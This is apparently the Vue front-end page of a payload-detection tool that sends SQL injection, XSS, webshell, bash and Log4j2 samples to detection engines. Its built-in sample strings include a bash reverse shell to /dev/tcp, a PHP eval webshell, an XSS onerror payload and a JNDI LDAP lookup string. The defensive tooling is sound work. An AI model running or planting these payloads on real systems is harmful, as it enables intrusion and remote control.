<template>
  <n-card :bordered="false" class="proCard" title="攻击载荷检测">
    <n-tabs v-model:value="activeTab" type="line" animated @update:value="onTabChange">
      <n-tab v-for="t in tabList" :key="t.key" :name="t.key" :tab="t.title" />
    </n-tabs>

    <n-form :model="textValue" ref="formRef" label-placement="left" class="py-4">
      <n-space vertical>
        <n-input
          :placeholder="current.placeholder"
          type="textarea"
          size="medium"
          :autosize="{ minRows: 4, maxRows: 12 }"
          show-count
          clearable
          v-model:value="textValue.payload"
        />
      </n-space>
      <n-space class="py-2">
        <n-button type="primary" :loading="formBtnLoading" @click="textSubmit">
          {{ activeTab === 'auto' ? '智能识别' : '提交检测' }}
        </n-button>
        <n-button @click="resetForm">重置</n-button>
        <n-dropdown
          v-if="activeTab === 'auto'"
          trigger="click"
          :options="autoSampleOptions"
          @select="fillAutoSample"
        >
          <n-button>示例</n-button>
        </n-dropdown>
        <n-button v-else @click="fillSample">示例</n-button>
      </n-space>
    </n-form>

    <!-- 智能识别结果：分类 + 各引擎明细 -->
    <n-alert v-if="autoResult" :type="autoResult.found ? 'success' : 'info'" class="mb-4" closable @close="autoResult = null">
      <template #header>{{ autoResult.title }}</template>
      <n-space vertical>
        <n-space>
          <n-tag
            v-for="it in autoResult.items"
            :key="it.type"
            :type="it.found ? 'error' : 'default'"
            size="small"
          >
            {{ it.title }}{{ it.found ? ' 命中' : '' }}
          </n-tag>
        </n-space>
        <div style="white-space: pre-wrap; word-break: break-all">{{ autoResult.detail }}</div>
        <n-space>
          <n-button
            v-if="autoResult.type && autoResult.type !== 'log4j2'"
            size="small"
            type="primary"
            @click="gotoType(autoResult.type)"
          >
            查看「{{ autoResult.title }}」检测记录
          </n-button>
          <n-button
            v-else-if="autoResult.type === 'log4j2'"
            size="small"
            type="primary"
            @click="router.push({ name: 'log4j2' })"
          >
            前往 Log4j2 工具解析
          </n-button>
        </n-space>
      </n-space>
    </n-alert>

    <n-alert v-if="lastResult" :type="lastResult.found ? 'success' : 'info'" class="mb-4" closable @close="lastResult = null">
      <template #header>{{ lastResult.title }}</template>
      <div v-if="lastResult.detail" style="white-space: pre-wrap; word-break: break-all">{{ lastResult.detail }}</div>
    </n-alert>

    <BasicTable
      v-if="activeTab !== 'auto'"
      :key="activeTab"
      :columns="current.columns()"
      :request="loadDataTable"
      :row-key="(row) => row.id"
      ref="actionRef"
      :actionColumn="actionColumn"
      @update:checked-row-keys="onCheckedRow"
      :scroll-x="1090"
    >
      <template #tableTitle>
        <n-button type="primary" @click="addTable">
          <template #icon><n-icon><PlusOutlined /></n-icon></template>
          添加检测任务
        </n-button>
        <n-button @click="uploadFile">
          <template #icon><n-icon><PlusOutlined /></n-icon></template>
          {{ current.uploadText }}
        </n-button>
      </template>

      <template #toolbar>
        <n-button type="primary" @click="reloadTable">刷新数据</n-button>
      </template>
    </BasicTable>

    <n-modal v-model:show="showModal" :show-icon="false" preset="dialog" title="添加检测任务">
      <n-form :model="formParams" ref="modalFormRef" label-placement="left" :label-width="80" class="py-4">
        <n-form-item :label="current.title" path="fileId">
          <n-select
            placeholder="请选择文件"
            label-field="label"
            value-field="value"
            children-field="children"
            filterable
            :options="fileList"
            v-model:value="formParams.fileId"
          />
        </n-form-item>
      </n-form>

      <template #action>
        <n-space>
          <n-button @click="() => (showModal = false)">取消</n-button>
          <n-button type="info" :loading="formBtnLoading" @click="confirmForm">开始检测</n-button>
        </n-space>
      </template>
    </n-modal>
  </n-card>
</template>

<script lang="ts" setup>
import { h, reactive, ref, computed } from 'vue';
import { useMessage } from 'naive-ui';
import { BasicTable, TableAction } from '@/components/Table';
import {
  getPayloadTableList,
  getWebshellTableList,
  getWebshellDetailTableList,
  riskDetectOnce,
  getTableRiskSqliList, addTableRiskSqliList, addOnceRiskSqliList, delTableRiskSqliList,
  getTableRiskXSSList, addTableRiskXSSList, addOnceRiskXSSList, delTableRiskXSSList,
  getTableRiskWebshellList, addTableRiskWebshellList, addOnceRiskWebshellList, delTableRiskWebshellList,
  getTableRiskBASHList, addTableRiskBASHList, addOnceRiskBASHList, delTableRiskBASHList,
} from '@/api/table/list';
import { payloadColumns, webshellColumns } from './columns';
import { PlusOutlined } from '@vicons/antd';
import { useRouter } from 'vue-router';

const router = useRouter();
const message = useMessage();
const formRef: any = ref(null);
const modalFormRef: any = ref(null);
const actionRef = ref();

const showModal = ref(false);
const formBtnLoading = ref(false);
const fileList = ref<Array<any>>([]);
const lastResult = ref<any>(null);

// 各检测类型的差异化配置
const TAB_CONFIG: Record<string, any> = {
  auto: {
    title: '智能识别',
    placeholder: '粘贴任意载荷内容，自动识别攻击类别并调用对应引擎检测',
    sample: '',
  },
  sqli: {
    title: 'SQLi检测',
    field: 'payload',
    storeType: 'payload',
    placeholder: '填写 sqli payload 内容',
    sample: `) or true--","' or 'x'='x","'`,
    uploadText: '上传payload文件',
    uploadRoute: 'payload-list',
    columns: payloadColumns,
    list: getTableRiskSqliList,
    submit: addTableRiskSqliList,
    once: addOnceRiskSqliList,
    del: delTableRiskSqliList,
  },
  xss: {
    title: 'XSS检测',
    field: 'payload',
    storeType: 'payload',
    placeholder: '填写 xss payload 内容',
    sample: `IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))`,
    uploadText: '上传payload文件',
    uploadRoute: 'payload-list',
    columns: payloadColumns,
    list: getTableRiskXSSList,
    submit: addTableRiskXSSList,
    once: addOnceRiskXSSList,
    del: delTableRiskXSSList,
  },
  webshell: {
    title: 'Webshell检测',
    field: 'webshell',
    storeType: 'webshell',
    placeholder: '填写 webshell 文件内容（支持 jsp/php/asp/aspx，可识别 base64/gzip/hex/xor 等编码混淆）',
    sample: `<?php @eval($_POST['cmd']); ?>`,
    // 内置示例样本名（webshell 仓库中的种子文件），命中时优先载入其内容
    sampleName: '1.jsp',
    uploadText: '上传webshell文件',
    uploadRoute: 'webshell-list',
    columns: webshellColumns,
    list: getTableRiskWebshellList,
    submit: addTableRiskWebshellList,
    once: addOnceRiskWebshellList,
    del: delTableRiskWebshellList,
  },
  bash: {
    title: 'Bash命令检测',
    field: 'payload',
    storeType: 'payload',
    placeholder: '填写 bash 命令内容（支持混淆还原检测）',
    sample: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
    uploadText: '上传payload文件',
    uploadRoute: 'payload-list',
    columns: payloadColumns,
    list: getTableRiskBASHList,
    submit: addTableRiskBASHList,
    once: addOnceRiskBASHList,
    del: delTableRiskBASHList,
  },
};

const tabList = [
  { key: 'auto', title: '智能识别' },
  { key: 'sqli', title: 'SQLi检测' },
  { key: 'xss', title: 'XSS检测' },
  { key: 'webshell', title: 'Webshell检测' },
  { key: 'bash', title: 'Bash命令检测' },
];

const activeTab = ref('auto');
const current = computed(() => TAB_CONFIG[activeTab.value]);

const initialText = { payload: '' };
const textValue = reactive({ ...initialText });
const formParams = reactive({ fileId: null });

const params = ref({
  name: null,
  state: null,
  pageSize: 10,
});

const actionColumn = reactive({
  width: 160,
  title: '操作',
  key: 'action',
  fixed: 'right',
  render(record) {
    return h(TableAction as any, {
      style: 'button',
      actions: [
        {
          label: '删除',
          onClick: handleDelete.bind(null, record),
          ifShow: () => true,
          auth: ['basic_list'],
        },
      ],
    });
  },
});

function onTabChange() {
  lastResult.value = null;
  autoResult.value = null;
  textValue.payload = '';
}

// ===== 智能识别（统一入口） =====
const autoResult = ref<any>(null);

const autoSamples: Record<string, string> = {
  sqli: `' or 'x'='x`,
  xss: `IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"`,
  webshell: `<?php @eval($_POST['cmd']); ?>`,
  bash: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
  log4j2: `\${jndi:ldap://127.0.0.1:1389/Exploit}`,
};

const autoSampleOptions = [
  { label: 'SQL注入', key: 'sqli' },
  { label: 'XSS', key: 'xss' },
  { label: 'Webshell', key: 'webshell' },
  { label: 'Bash命令', key: 'bash' },
  { label: 'Log4j2 JNDI', key: 'log4j2' },
];

function gotoType(type: string) {
  activeTab.value = type;
  autoResult.value = null;
}

function fillAutoSample(key: string) {
  textValue.payload = autoSamples[key] || '';
  textSubmit(new Event('submit'));
}

function fillSample() {
  const cfg = current.value;
  const submit = () => {
    textValue.payload = textValue.payload || cfg.sample || '';
    textSubmit(new Event('submit'));
  };
  // 配置了内置样本名时，优先从样本仓库载入完整文件内容
  if (cfg.sampleName) {
    getWebshellDetailTableList({ search: cfg.sampleName, page: 1, pageSize: 1 })
      .then((resp) => {
        textValue.payload = typeof resp === 'string' && resp ? resp : cfg.sample || '';
      })
      .catch(() => {
        textValue.payload = cfg.sample || '';
      })
      .finally(submit);
    return;
  }
  textValue.payload = cfg.sample || '';
  submit();
}

function detectSubmit() {
  formBtnLoading.value = true;
  riskDetectOnce({ payload: textValue.payload })
    .then((resp) => {
      const j = resp?.result ?? {};
      const r = j.result ?? {};
      const items = r.items || [];
      const detail = items
        .map((it) => `[${it.found ? '命中' : '未检出'}] ${it.title}: ${typeof it.result === 'string' ? it.result : JSON.stringify(it.result)}`)
        .join('\n');
      autoResult.value = {
        found: !!r.found,
        type: r.type || '',
        title: r.found ? `识别为「${r.title}」` : j.message || '未识别出攻击类别',
        items,
        detail,
      };
      if (r.found) {
        message.success(`识别为 ${r.title}`);
      } else {
        message.info(j.message || '未识别出攻击类别');
      }
    })
    .catch(() => {
      message.error('检测请求失败');
    })
    .finally(() => {
      formBtnLoading.value = false;
    });
}

const loadDataTable = async (res) => {
  return await current.value.list({ ...params.value, ...res });
};

// 获取待检测文件列表（payload 库 / webshell 库）
function getFileOptions() {
  const loader =
    current.value.storeType === 'webshell'
      ? getWebshellTableList({ pageSize: 10000, page: 1 })
      : getPayloadTableList({ pageSize: 10000, page: 1 });
  loader.then(function (resp) {
    var arr = new Array();
    for (let i = 0; i < resp['list'].length; i++) {
      arr.push({
        label: resp['list'][i]['name'],
        value: resp['list'][i]['id'],
      });
    }
    fileList.value = arr;
  });
}

function addTable() {
  formParams.fileId = null;
  getFileOptions();
  showModal.value = true;
}

// 提交文件检测任务
function confirmForm(e) {
  e.preventDefault();
  if (!formParams.fileId) {
    message.error('请选择文件');
    return;
  }
  formBtnLoading.value = true;
  const body: any = {};
  body[current.value.field] = formParams.fileId;
  current.value.submit(body);
  message.success('新建成功');
  setTimeout(() => {
    showModal.value = false;
    reloadTable();
  }, 500);
  formBtnLoading.value = false;
}

function onCheckedRow(rowKeys) {
  console.log(rowKeys);
}

function reloadTable() {
  actionRef.value.reload();
}

function handleDelete(record: Recordable) {
  setTimeout(() => {
    current.value.del(record);
    reloadTable();
  }, 500);
}

function uploadFile() {
  let routeData = router.resolve({ name: current.value.uploadRoute });
  window.open(routeData.href, '_blank');
}

// 即时检测：统一解析各类型返回结果
// 响应结构为 JsonResponse: {code, message, result, type}
//   sqli/xss:    result 为字符串
//   webshell:    result 为 {webshell, score, lang, chain, code, hits, result}
//   bash:        result 为 {found, score, normalized, steps, hits, result}
function showOnceResult(resp) {
  const jres = resp?.result ?? resp ?? {};
  const inner = jres?.result ?? jres;
  let found = false;
  let title = '';
  let detail = '';

  if (inner && typeof inner === 'object' && !Array.isArray(inner)) {
    // webshell / bash 返回结构化对象
    found = inner.webshell === true || inner.found === true;
    title = inner.result || jres.message || '检测完成';
    const parts: string[] = [];
    if (inner.score !== undefined) parts.push(`评分: ${inner.score}`);
    if (inner.lang) parts.push(`语言: ${inner.lang}`);
    if (inner.hits && inner.hits.length) parts.push(`命中特征: ${inner.hits.join(', ')}`);
    if (inner.chain) parts.push(`解码链: ${inner.chain}`);
    if (inner.steps && inner.steps.length) parts.push(`还原步骤: ${inner.steps.join(', ')}`);
    if (inner.normalized && inner.normalized !== textValue.payload)
      parts.push(`还原结果: ${inner.normalized}`);
    if (inner.code) parts.push(`解码代码:\n${inner.code}`);
    detail = parts.join('\n');
  } else {
    // sqli / xss 返回字符串结果
    title = (typeof inner === 'string' && inner) || jres.message || '检测完成';
    found = jres.code === 20000;
  }

  lastResult.value = { found, title, detail };
  if (found) {
    message.success(title);
  } else {
    message.info(title);
  }
}

function textSubmit(e) {
  e.preventDefault();
  if (!textValue.payload) {
    message.error('请填写检测内容');
    return;
  }
  if (activeTab.value === 'auto') {
    detectSubmit();
    return;
  }
  formBtnLoading.value = true;
  const body: any = {};
  body[current.value.field] = textValue.payload;
  current.value
    .once(body)
    .then((resp) => {
      showOnceResult(resp);
    })
    .catch(() => {
      message.error('检测请求失败');
    })
    .finally(() => {
      formBtnLoading.value = false;
    });
}

function resetForm() {
  textValue.payload = '';
  lastResult.value = null;
  autoResult.value = null;
}
</script>
